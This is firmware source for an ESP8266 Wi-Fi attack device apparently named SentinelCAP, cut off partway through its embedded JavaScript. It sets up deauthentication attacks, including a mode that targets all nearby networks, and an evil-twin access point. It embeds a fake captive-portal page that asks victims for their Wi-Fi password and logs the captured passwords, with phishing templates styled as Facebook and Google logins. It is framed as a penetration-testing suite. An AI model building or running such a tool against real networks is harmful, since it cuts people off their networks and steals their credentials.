// --- Include necessary libraries ---
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <ArduinoJson.h>
#include <Updater.h>

// --- OLED Libraries ---
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

// --- Global Definitions ---
#define APP_NAME "SentinelCAP"
#define DEFAULT_ADMIN_AP_SSID "Linuxhackingid-SentinelCAP"
#define DEFAULT_ADMIN_AP_PASSWORD "Linuxhackingid"
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

const char CAPTURED_PASSWORDS_FILE[] = "/captured_passwords.log";
const char SETTINGS_FILE[] = "/settings.json";

// --- OLED Definitions ---
#define OLED_SDA_PIN D1
#define OLED_SCL_PIN D2
#define OLED_ADDRESS 0x3C
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// --- Global File Object for Upload ---
File fsUploadFile;
bool uploadErrorOccurred = false;

// --- Network Structures ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  String security;
} _Network;

_Network _networks[16]; // Max 16 networks for simplicity
_Network _selectedNetwork;

// --- Global State Variables ---
String _capturedPasswordsLog = "";
bool hotspot_active = false;
bool deauthing_active = false;
bool deauth_all_ssids = false; // NEW: Flag for deauth all SSIDs
unsigned long lastDeauthTime = 0;
unsigned long lastDeauthAllTime = 0; // NEW: For deauth all interval
int currentDeauthAllIndex = 0;       // NEW: For iterating through networks in deauth all mode
unsigned long lastWifiStatusCheck = 0;
unsigned long startTime = 0;
unsigned long lastOLEDUpdate = 0;
unsigned long lastScanTime = 0; // For periodic scan in deauth all mode

// --- NEW: Deauth Attack Tracking ---
unsigned long deauthStartTime = 0;
unsigned long deauthPacketCount = 0;
unsigned long deauthInterval = 1000; // Default 1 packet per second

// --- NEW: Evil Twin Attack Tracking ---
unsigned long evilTwinStartTime = 0;
String lastCapturedCredential = "None";


// --- New: Global Settings Structure ---
struct AppSettings {
  String adminApSsid;
  String adminApPassword;
  bool enableDebugLogs;
  String defaultCaptivePortalTemplate;
  String webAdminUsername;
  String webAdminPassword;
  int deauthPacketRate; // NEW: Deauth packets per second
};

AppSettings appSettings;

// --- Function Prototypes ---
extern AppSettings appSettings;

void setup();
void loop();
void clearNetworkArray();
void performScan();
String bytesToStr(const uint8_t* b, uint32_t size);
String getSecurityType(uint8_t encryptionType);

// --- File Serving Handlers ---
bool handleFileRead(String path);
void handleNotFound();
bool isAuthenticated();

// --- API Handlers (JSON Responses) ---
void handleApiScan();
void handleApiSelectNetwork();
void handleApiToggleDeauth(); // Modified
void handleApiToggleHotspot();
void handleApiStatus(); // Modified
void handleApiLogs();
void handleApiClearLogs();
void handleApiDownloadLogs();
void handleApiFiles();
void handleApiDeselectNetwork(); // Modified
void handleApiManualScan();

// --- File Upload/Delete Handlers ---
void handleFileUpload();
void handleFileDelete();

// --- Captive Portal Handlers ---
void handleCaptivePortal();
void handleCaptivePortalSubmit();

// --- System Control ---
void handleRestart();

// --- New: Settings Management Functions ---
void loadSettings();
void saveSettings();
void handleApiGetSettings();
void handleApiSaveSettings();

// --- New: Password Log Management Functions ---
void loadCapturedPasswords();
void saveCapturedPasswords();

// --- OLED Update Function ---
void updateOLEDDisplay(); // Modified

// --- NEW: OTA Update Handlers ---
void handleOTAUpdate();


// --- Embedded File Contents (as String Literals) ---

const char CAPTIVE_PORTAL_TEMPLATE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {SSID}</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding-top: 50px; }
        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { color: #333; }
        input[type="password"] { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to {SSID}</h1>
        <p>Please enter your WiFi password to continue.</p>
        <form action="/submit_password" method="post">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <p style="font-size: 0.8em; color: #666; margin-top: 20px;">Powered by {DEVICE_NAME}</p>
    </div>
</body>
</html>
)rawliteral";

const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EvilTwin - SentinelCAP Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="container-wrapper">
        <header class="header">
            <div class="logo">
                <i class="fas fa-crow"></i>
                EvilTwin - SentinelCAP
            </div>
            <button class="menu-toggle" onclick="toggleSidebar()">
                <i class="fas fa-bars"></i>
            </button>
        </header>

        <nav class="sidebar" id="sidebar">
            <a href="#" class="nav-item active" data-tab="dashboard">
                <i class="fas fa-home"></i>
                Dashboard
            </a>
            <a href="#" class="nav-item" data-tab="scanner">
                <i class="fas fa-wifi"></i>
                Scanner
            </a>
            <a href="#" class="nav-item" data-tab="attack">
                <i class="fas fa-skull-crossbones"></i>
                Attack
            </a>
            <a href="#" class="nav-item" data-tab="captive-editor">
                <i class="fas fa-file-code"></i>
                Captive Portal
            </a>
            <a href="#" class="nav-item" data-tab="filemanager">
                <i class="fas fa-folder-open"></i>
                File Manager
            </a>
            <a href="#" class="nav-item" data-tab="logs">
                <i class="fas fa-clipboard-list"></i>
                Logs
            </a>
            <a href="#" class="nav-item" data-tab="settings">
                <i class="fas fa-cog"></i>
                Settings
            </a>
            <a href="#" class="nav-item" data-tab="firmware-update">
                <i class="fas fa-upload"></i>
                Firmware Update
            </a>
            <a href="#" class="nav-item" id="reboot-btn">
                <i class="fas fa-power-off"></i>
                Reboot Device
            </a>
        </nav>

        <main class="main-content" id="mainContent">
            <div id="dashboard-tab" class="tab-content active">
                <div class="status-grid">
                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-bullseye"></i>
                            </div>
                            <div class="card-info">
                                <h3>Target Network</h3>
                                <p id="target-ssid">None Selected</p>
                            </div>
                        </div>
                    </div>

                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-ghost"></i>
                            </div>
                            <div class="card-info">
                                <h3>Evil Twin Status</h3>
                                <p id="hotspot-status"><span class="text-red">Inactive</span></p>
                            </div>
                        </div>
                    </div>

                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-unlink"></i>
                            </div>
                            <div class="card-info">
                                <h3>Deauth Attack</h3>
                                <p id="deauth-status"><span class="text-red">Stopped</span></p>
                            </div>
                        </div>
                    </div>

                    <div class="status-card">
                        <div class="card-header">
                            <div class="card-icon">
                                <i class="fas fa-key"></i>
                            </div>
                            <div class="card-info">
                                <h3>Captured Passwords</h3>
                                <p id="password-count">0</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Welcome to EvilTwin - SentinelCAP</h2>
                    <p style="color: #cccccc; line-height: 1.6;">
                        SentinelCAP is a powerful WiFi penetration testing suite. Use the navigation menu to access different features including network scanning, deauthentication attacks, evil twin hotspots, and captive portal management.
                    </p>
                    <br>
                    <p style="color: #999999; line-height: 1.6;">
                        Current system status is <strong style="color: #ff3333;" id="system-status-text">Idle</strong>. Select a function from the sidebar to begin operations.
                    </p>
                    <div class="quick-actions">
                        <button id="quick-scan-btn" class="action-btn"><i class="fas fa-search"></i> Quick Network Scan</button>
                        <button id="generate-report-btn" class="action-btn"><i class="fas fa-file-alt"></i> Generate Report</button>
                    </div>
                </div>

                <div class="content-area">
                    <h3 style="color: #ff3333; margin-bottom: 20px;">System Information</h3>
                    <div class="system-info-grid">
                        <div><strong>IP Address:</strong> <span id="ip-address">Loading...</span></div>
                        <div><strong>MAC Address:</strong> <span id="mac-address">Loading...</span></div>
                        <div><strong>Uptime:</strong> <span id="uptime">0h:00m:00s</span></div>
                        <div><strong>Memory Usage:</strong> <span id="memory-percent">0%</span> (<span id="free-heap">0</span>/<span id="total-heap">0</span> bytes free)</div>
                    </div>
                </div>

                <div class="content-area">
                    <h3 style="color: #ff3333; margin-bottom: 20px;">Live Terminal Output</h3>
                    <div class="terminal-output" id="terminal">
                        <div>[INFO] SentinelCAP initialized successfully</div>
                        <div>[INFO] WiFi interface ready</div>
                        <div>[INFO] Web server started on port 80</div>
                    </div>
                </div>
            </div>

            <div id="scanner-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">WiFi Network Scanner</h2>
                        <div>
                            <button id="manual-scan-btn" class="action-btn"><i class="fas fa-sync-alt"></i> Manual Scan</button>
                            <button id="deselect-network-btn" class="action-btn red-btn"><i class="fas fa-times-circle"></i> Deselect Network</button>
                        </div>
                    </div>
                    <div class="networks-list" id="networks-list">
                        <p class="text-gray">Click "Manual Scan" to find networks.</p>
                    </div>
                </div>
            </div>

            <div id="attack-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Attack Tools</h2>
                    <div class="attack-grid">
                        <div class="attack-card">
                            <h3>Deauthentication Attack</h3>
                            <p class="text-gray">Disconnect clients from the target network by sending deauth packets.</p>
                            <button id="deauth-btn" class="action-btn red-btn">Start Deauth Attack</button>
                            <button id="deauth-all-btn" class="action-btn orange-btn" style="margin-top: 10px;">Start Deauth All</button>
                        </div>
                        <div class="attack-card">
                            <h3>Evil Twin Hotspot</h3>
                            <p class="text-gray">Create a fake access point to capture credentials.</p>
                            <button id="hotspot-btn" class="action-btn purple-btn">Start Evil Twin</button>
                        </div>
                    </div>
                </div>
            </div>

            <div id="captive-editor-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Captive Portal Editor</h2>
                    <div class="editor-controls">
                        <select id="template-select">
                            <option value="default">Default Template</option>
                            <option value="facebook">Facebook Login</option>
                            <option value="google">Google WiFi</option>
                            <option value="router">Router Admin</option>
                        </select>
                        <button id="load-template-btn" class="action-btn small-btn"><i class="fas fa-file-import"></i> Load</button>
                        <button id="save-template-btn" class="action-btn small-btn"><i class="fas fa-save"></i> Save Custom</button>
                        <button id="deploy-template-btn" class="action-btn small-btn green-btn"><i class="fas fa-upload"></i> Deploy Live</button>
                    </div>
                    <textarea id="html-editor" class="code-editor"></textarea>
                    <div class="preview-section">
                        <h3>Live Preview</h3>
                        <iframe id="preview-iframe" class="preview-frame" src="about:blank"></iframe>
                        <div class="template-variables">
                            <h4>Template Variables:</h4>
                            <p><code>{SSID}</code> - Target network name</p>
                            <p><code>{DEVICE_NAME}</code> - Device identifier</p>
                            <p><code>{CURRENT_TIME}</code> - Current timestamp</p>
                            <p><code>{CUSTOM_MESSAGE}</code> - Custom message</p>
                        </div>
                    </div>
                </div>
                <div class="content-area">
                    <h3 style="color: #ff3333; margin-bottom: 20px;">Template Library</h3>
                    <div class="template-library-grid" id="template-library">
                    </div>
                </div>
            </div>

            <div id="filemanager-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">File Manager</h2>
                        <button id="show-upload-modal-btn" class="action-btn"><i class="fas fa-upload"></i> Upload File</button>
                    </div>
                    <div class="files-list" id="files-list">
                        <p class="text-gray">No files found on device.</p>
                    </div>
                </div>
            </div>

            <div id="logs-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">Captured Passwords</h2>
                        <div>
                            <button id="clear-logs-btn" class="action-btn small-btn red-btn"><i class="fas fa-trash-alt"></i> Clear</button>
                            <button id="download-logs-btn" class="action-btn small-btn green-btn"><i class="fas fa-download"></i> Download</button>
                        </div>
                    </div>
                    <div class="terminal-output" id="password-logs">
                        <div class="text-gray">No passwords captured yet...</div>
                    </div>
                </div>
                <div class="content-area">
                    <h2 style="color: #ff3333;">System Logs</h2>
                    <div class="terminal-output" id="system-logs">
                        <div>[INFO] System started</div>
                        <div>[INFO] Monitoring WiFi networks</div>
                    </div>
                </div>
            </div>

            <div id="settings-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Device Settings</h2>
                    <div class="settings-section">
                        <h3>Admin Access Point</h3>
                        <div class="form-group">
                            <label for="admin-ap-ssid">SSID:</label>
                            <input type="text" id="admin-ap-ssid" placeholder="Admin AP SSID">
                        </div>
                        <div class="form-group">
                            <label for="admin-ap-password">Password:</label>
                            <input type="password" id="admin-ap-password" placeholder="Admin AP Password">
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Web Interface Authentication</h3>
                        <div class="form-group">
                            <label for="web-admin-username">Username:</label>
                            <input type="text" id="web-admin-username" placeholder="Web Admin Username">
                        </div>
                        <div class="form-group">
                            <label for="web-admin-password">Password:</label>
                            <input type="password" id="web-admin-password" placeholder="Web Admin Password">
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Logging & Debug</h3>
                        <div class="form-group checkbox-group">
                            <input type="checkbox" id="enable-debug-logs">
                            <label for="enable-debug-logs">Enable Debug Logs (to Serial)</label>
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Captive Portal Default</h3>
                        <div class="form-group">
                            <label for="default-captive-template">Default Template:</label>
                            <select id="default-captive-template">
                                <option value="default">Default Template</option>
                                <option value="facebook">Facebook Login</option>
                                <option value="google">Google WiFi</option>
                                <option value="router">Router Admin</option>
                                <option value="custom">Custom (from uploaded file)</option>
                            </select>
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Deauthentication Attack</h3>
                        <div class="form-group">
                            <label for="deauth-packet-rate">Packet Rate (packets/sec):</label>
                            <input type="number" id="deauth-packet-rate" min="1" max="100" value="1">
                        </div>
                    </div>
                    <button id="save-settings-btn" class="action-btn green-btn"><i class="fas fa-save"></i> Save Settings</button>
                </div>
            </div>

            <div id="firmware-update-tab" class="tab-content">
                <div class="content-area">
                    <h2 style="color: #ff3333; margin-bottom: 20px;">Firmware Update (OTA)</h2>
                    <p class="text-gray">Upload a new firmware (.bin) file to update the device.</p>
                    <div class="drop-area" id="firmware-drop-area">
                        <i class="fas fa-upload"></i>
                        <p>Drag & Drop .bin file here or click to browse</p>
                        <input type="file" id="firmware-input" accept=".bin" class="hidden-input">
                    </div>
                    <div class="progress-container" style="display: none;">
                        <div class="progress-bar" id="firmware-progress-bar"></div>
                        <div class="progress-text" id="firmware-progress-text">0%</div>
                    </div>
                    <p id="firmware-status-message" class="text-gray" style="margin-top: 15px;"></p>
                </div>
            </div>

            <footer class="footer">
                © <span>EvilTwin - SentinelCAP</span>. All Right Reserved. | Firmware By: <span>Linuxhackingid</span>
            </footer>
        </main>
    </div>

    <div id="upload-modal" class="modal hidden">
        <div class="modal-content">
            <span class="close-button" onclick="closeUploadModal()">&times;</span>
            <h2>Upload File</h2>
            <div class="drop-area" id="file-drop-area">
                <i class="fas fa-cloud-upload-alt"></i>
                <p>Drag & Drop files here or click to browse</p>
                <input type="file" id="file-input" class="hidden-input">
            </div>
            <button class="action-btn red-btn" id="cancel-upload-btn">Cancel</button>
        </div>
    </div>

    <script src="/script.js"></script>
</body>
</html>
)rawliteral";

const char STYLE_CSS[] PROGMEM = R"rawliteral(
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #1a1a1a;
    color: #ffffff;
    overflow-x: hidden;
}

.container-wrapper {
    display: flex;
    min-height: 100vh;
}

.header {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: 60px;
    background-color: #1a1a1a;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 20px;
    z-index: 1000;
    border-bottom: 1px solid #333;
}

.logo {
    display: flex;
    align-items: center;
    font-size: 20px;
    font-weight: bold;
    color: #ff3333;
}

.logo i {
    margin-right: 8px;
    font-size: 24px;
}

.menu-toggle {
    background: none;
    border: none;
    color: #ff3333;
    font-size: 24px;
    cursor: pointer;
    display: none;
    z-index: 1001;
    padding: 5px;
}

.sidebar {
    width: 250px;
    background-color: #0f0f0f;
    padding-top: 80px;
    position: fixed;
    height: 100vh;
    overflow-y: auto;
    transition: transform 0.3s ease;
    border-right: 1px solid #333;
    z-index: 999;
    transform: translateX(0);
}

.nav-item {
    display: flex;
    align-items: center;
    padding: 15px 20px;
    color: #cccccc;
    text-decoration: none;
    transition: all 0.3s ease;
    border-bottom: 1px solid #333;
    cursor: pointer;
}

.nav-item:hover,
.nav-item.active {
    background-color: #ff3333;
    color: #ffffff;
}

.nav-item i {
    margin-right: 12px;
    width: 20px;
    text-align: center;
    color: #ff3333;
}

.nav-item:hover i,
.nav-item.active i {
    color: #ffffff;
}

.main-content {
    flex: 1;
    margin-left: 250px;
    padding: 80px 30px 30px;
    transition: margin-left 0.3s ease;
}

.main-content.expanded {
    margin-left: 0;
}

.status-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.status-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.status-card:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 20px rgba(255, 51, 51, 0.2);
}

.card-header {
    display: flex;
    align-items: center;
    margin-bottom: 15px;
}

.card-icon {
    width: 40px;
    height: 40px;
    background-color: #ff3333;
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-right: 15px;
    color: #ffffff;
    font-size: 18px;
}

.card-info h3 {
    color: #999999;
    font-size: 14px;
    margin-bottom: 5px;
    font-weight: normal;
}

.card-info p {
    color: #ffffff;
    font-size: 18px;
    font-weight: bold;
}

.content-area {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 30px;
    border: 1px solid #444;
    min-height: 150px;
    margin-bottom: 30px;
}

.quick-actions {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
    margin-top: 25px;
}

.action-btn {
    background-color: #333;
    color: #fff;
    border: none;
    padding: 12px 20px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
    transition: background-color 0.3s ease, transform 0.2s ease;
    display: flex;
    align-items: center;
    gap: 8px;
}

.action-btn:hover {
    background-color: #ff3333;
    transform: translateY(-2px);
}

.action-btn.red-btn { background-color: #dc3545; }
.action-btn.red-btn:hover { background-color: #c82333; }
.action-btn.purple-btn { background-color: #6f42c1; }
.action-btn.purple-btn:hover { background-color: #563d7c; }
.action-btn.orange-btn { background-color: #fd7e14; }
.action-btn.orange-btn:hover { background-color: #e66a00; }
.action-btn.green-btn { background-color: #28a745; }
.action-btn.green-btn:hover { background-color: #218838; }
.action-btn.small-btn {
    padding: 8px 15px;
    font-size: 14px;
}

.system-info-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
    color: #cccccc;
}

.system-info-grid strong {
    color: #ff3333;
}

.terminal-output {
    background-color: #111;
    border: 1px solid #333;
    border-radius: 5px;
    padding: 15px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 14px;
    color: #00ff41;
    max-height: 300px;
    overflow-y: auto;
    white-space: pre-wrap;
    word-break: break-all;
}

.terminal-output div {
    margin-bottom: 5px;
}

.networks-list .network-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 10px;
    border: 1px solid #444;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: background-color 0.3s ease;
}

.networks-list .network-card:hover {
    background-color: #3a3a3a;
}

.networks-list .network-card .ssid-info {
    display: flex;
    align-items: center;
    gap: 10px;
}

.networks-list .network-card .ssid-info .signal-icon {
    font-size: 24px;
    color: #ff3333;
}

.networks-list .network-card .details {
    text-align: right;
}

.networks-list .network-card .details .text-gray {
    color: #999;
    font-size: 13px;
}

.networks-list .network-card .select-btn {
    background-color: #ff3333;
    color: #fff;
    border: none;
    padding: 8px 15px;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.networks-list .network-card .select-btn:hover {
    background-color: #cc0000;
}

.networks-list .network-card.selected {
    border: 2px solid #ff3333;
    box-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
}

.attack-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}

.attack-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
}

.attack-card h3 {
    color: #ff3333;
    margin-bottom: 10px;
}

.attack-card .action-btn {
    width: 100%;
    margin-top: 15px;
}

.editor-controls {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 20px;
    align-items: center;
}

.editor-controls select,
.editor-controls input[type="text"] {
    background-color: #111;
    border: 1px solid #444;
    color: #fff;
    padding: 8px 10px;
    border-radius: 5px;
    flex-grow: 1;
    min-width: 150px;
}

.code-editor {
    width: 100%;
    height: 400px;
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    padding: 15px;
    color: #fff;
    font-family: 'Consolas', 'Monaco', monospace;
    resize: vertical;
    margin-bottom: 20px;
}

.preview-section h3 {
    color: #ff3333;
    margin-bottom: 10px;
}

.preview-frame {
    width: 100%;
    height: 300px;
    border: 1px solid #444;
    border-radius: 5px;
    background-color: #fff;
}

.template-variables {
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    padding: 15px;
    margin-top: 20px;
}

.template-variables h4 {
    color: #ff3333;
    margin-bottom: 10px;
}

.template-variables p {
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    color: #cccccc;
    margin-bottom: 5px;
}

.template-variables code {
    color: #66ccff;
}

.template-library-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px;
}

.template-card {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 15px;
    border: 1px solid #444;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.template-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}

.template-card h4 {
    color: #ff3333;
    margin-bottom: 5px;
}

.template-card p {
    color: #999;
    font-size: 13px;
    margin-bottom: 10px;
}

.template-card .template-actions {
    display: flex;
    gap: 10px;
}

.files-list .file-item {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 10px;
    border: 1px solid #444;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: background-color 0.3s ease;
}

.files-list .file-item:hover {
    background-color: #3a3a3a;
}

.files-list .file-item .file-info {
    display: flex;
    align-items: center;
    gap: 10px;
}

.files-list .file-item .file-icon {
    font-size: 24px;
    color: #66ccff;
}

.files-list .file-item .file-details h4 {
    color: #fff;
    margin-bottom: 3px;
}

.files-list .file-item .file-details p {
    color: #999;
    font-size: 13px;
}

.files-list .file-item .file-actions {
    display: flex;
    gap: 10px;
}

.text-gray {
    color: #999;
}

.settings-section {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 20px;
    border: 1px solid #444;
    margin-bottom: 20px;
}

.settings-section h3 {
    color: #ff3333;
    margin-bottom: 15px;
}

.form-group {
    margin-bottom: 15px;
}

.form-group label {
    display: block;
    color: #cccccc;
    margin-bottom: 8px;
    font-weight: bold;
}

.form-group input[type="text"],
.form-group input[type="password"],
.form-group input[type="number"], /* Added for number input */
.form-group select {
    width: 100%;
    padding: 10px;
    background-color: #111;
    border: 1px solid #444;
    border-radius: 5px;
    color: #fff;
    font-size: 16px;
}

.form-group input[type="checkbox"] {
    margin-right: 10px;
    width: auto;
}

.form-group.checkbox-group {
    display: flex;
    align-items: center;
}

.progress-container {
    width: 100%;
    background-color: #333;
    border-radius: 5px;
    margin-top: 20px;
    overflow: hidden;
    position: relative;
    height: 25px;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background-color: #28a745;
    border-radius: 5px;
    text-align: center;
    line-height: 25px;
    color: white;
    transition: width 0.3s ease;
}

.progress-text {
    position: absolute;
    width: 100%;
    text-align: center;
    line-height: 25px;
    color: white;
    font-weight: bold;
}


.footer {
    margin-top: auto;
    padding: 20px 30px;
    text-align: center;
    color: #666666;
    font-size: 14px;
    border-top: 1px solid #333;
}

.footer span {
    color: #ff3333;
}

.tab-content {
    display: none;
}

.tab-content.active {
    display: block;
    animation: fadeIn 0.6s ease-out;
}

.modal {
    display: none;
    position: fixed;
    z-index: 1001;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: auto;
    background-color: rgba(0,0,0,0.7);
    justify-content: center;
    align-items: center;
}

.modal-content {
    background-color: #2a2a2a;
    margin: auto;
    padding: 30px;
    border: 1px solid #444;
    border-radius: 10px;
    width: 80%;
    max-width: 500px;
    position: relative;
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    animation: slideIn 0.3s ease-out;
}

.modal-content h2 {
    color: #ff3333;
    margin-bottom: 20px;
    text-align: center;
}

.close-button {
    color: #aaa;
    position: absolute;
    top: 10px;
    right: 15px;
    font-size: 28px;
    font-weight: bold;
    cursor: pointer;
}

.close-button:hover,
.close-button:focus {
    color: #ff3333;
    text-decoration: none;
    cursor: pointer;
}

.drop-area {
    border: 2px dashed #ff3333;
    border-radius: 8px;
    padding: 40px;
    text-align: center;
    cursor: pointer;
    margin-bottom: 20px;
    transition: background-color 0.3s ease, border-color 0.3s ease;
}

.drop-area:hover {
    background-color: #3a3a3a;
    border-color: #fff;
}

.drop-area i {
    font-size: 50px;
    color: #ff3333;
    margin-bottom: 15px;
}

.drop-area p {
    color: #cccccc;
    font-size: 16px;
}

.hidden-input {
    display: none;
}

@media (max-width: 768px) {
    .menu-toggle {
        display: block;
    }

    .sidebar {
        transform: translateX(-100%);
        width: 200px;
        padding-top: 60px;
    }

    .sidebar.show {
        transform: translateX(0);
    }

    .main-content {
        margin-left: 0;
        padding: 80px 15px 15px;
    }

    .status-grid {
        grid-template-columns: 1fr;
    }

    .header {
        padding: 0 15px;
    }

    .quick-actions, .editor-controls {
        flex-direction: column;
        gap: 10px;
    }

    .action-btn {
        width: 100%;
    }

    .system-info-grid {
        grid-template-columns: 1fr;
    }

    .networks-list .network-card,
    .files-list .file-item {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
    }

    .networks-list .network-card .details,
    .files-list .file-item .file-actions {
        width: 100%;
        text-align: left;
        margin-top: 10px;
    }

    .networks-list .network-card .select-btn,
    .files-list .file-item .action-btn {
        width: 100%;
    }

    .attack-grid {
        grid-template-columns: 1fr;
    }

    .editor-controls select,
    .editor-controls input[type="text"] {
        width: 100%;
        min-width: unset;
    }

    .template-library-grid {
        grid-template-columns: 1fr;
    }
}

@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(20px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateY(-50px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

.status-card {
    animation: fadeIn 0.6s ease-out;
}

.status-card:nth-child(2) {
    animation-delay: 0.1s;
}

.status-card:nth-child(3) {
    animation-delay: 0.2s;
}

.status-card:nth-child(4) {
    animation-delay: 0.3s;
}

.sidebar::-webkit-scrollbar,
.terminal-output::-webkit-scrollbar,
.code-editor::-webkit-scrollbar,
.mass-spoofing-section textarea::-webkit-scrollbar {
    width: 6px;
}

.sidebar::-webkit-scrollbar-track,
.terminal-output::-webkit-scrollbar-track,
.code-editor::-webkit-scrollbar-track,
.mass-spoofing-section textarea::-webkit-scrollbar-track {
    background: #1a1a1a;
}

.sidebar::-webkit-scrollbar-thumb,
.terminal-output::-webkit-scrollbar-thumb,
.code-editor::-webkit-scrollbar-thumb,
.mass-spoofing-section textarea::-webkit-scrollbar-thumb {
    background: #ff3333;
    border-radius: 3px;
}

.sidebar::-webkit-scrollbar-thumb:hover,
.terminal-output::-webkit-scrollbar-thumb:hover,
.code-editor::-webkit-scrollbar-thumb:hover,
.mass-spoofing-section textarea::-webkit-scrollbar-thumb:hover {
    background: #ff5555;
}

.flex-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    flex-wrap: wrap;
    gap: 10px;
}

.text-red { color: #ff3333; }
.text-green { color: #00ff41; }
)rawliteral";

const char SCRIPT_JS[] PROGMEM = R"rawliteral(
let currentTab = 'dashboard';
let networks = [];
let selectedNetwork = null;
let isDeauthActive = false;
let isDeauthAllActive = false; // NEW: Frontend flag for deauth all
let isHotspotActive = false;
let capturedPasswords = [];
let htmlEditorContent = '';
let appSettings = {};

document.addEventListener('DOMContentLoaded', function() {
    console.log("DOM Content Loaded. Initializing UI...");
    initializeUI();
    loadDefaultTemplate();
    startStatusUpdates();
    populateTemplateLibrary();
    attachEventListeners();
    fetchFiles();
    fetchLogs(); // Fetch logs on startup
    fetchSettings();
    console.log("UI Initialization complete.");
});

function initializeUI() {
    console.log("initializeUI called.");
    showTab('dashboard');
}

function showTab(tabName) {
